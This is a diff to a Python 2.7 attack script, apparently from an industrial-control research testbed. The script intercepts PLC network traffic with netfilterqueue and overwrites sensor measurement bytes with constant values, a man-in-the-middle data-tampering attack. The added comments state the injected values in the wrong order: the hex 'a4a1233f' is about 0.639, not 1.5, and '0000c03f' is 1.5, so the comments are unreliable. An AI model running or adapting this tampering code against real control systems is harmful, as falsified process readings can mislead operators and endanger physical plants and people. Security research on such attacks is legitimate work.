@@ -1,4 +1,6 @@
 #! /usr/bin/env python2.7
+##### Script to launch MitM/Data tampering attack #####
+##### Takes one command line argument: PLC2/PLC3/BOTH #####
 
 from netfilterqueue import NetfilterQueue
 import os
@@ -24,6 +26,7 @@ def modify(packet):
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
+                # PLC2 measurments modified to a constant value, 1.5 in this case
                 newdata = mydata[:-8]+'a4a1233f'
                 print(newdata)
                 pkt[Raw].load = newdata.decode('hex') 
@@ -37,6 +40,7 @@ def modify(packet):
             if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                 print("Seba")
                 mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
+                # PLC3 measurements modified to a constant value, 0.63918519 in this case
                 newdata = mydata[:-8]+'0000c03f'
                 print(newdata)
                 pkt[Raw].load = newdata.decode('hex')
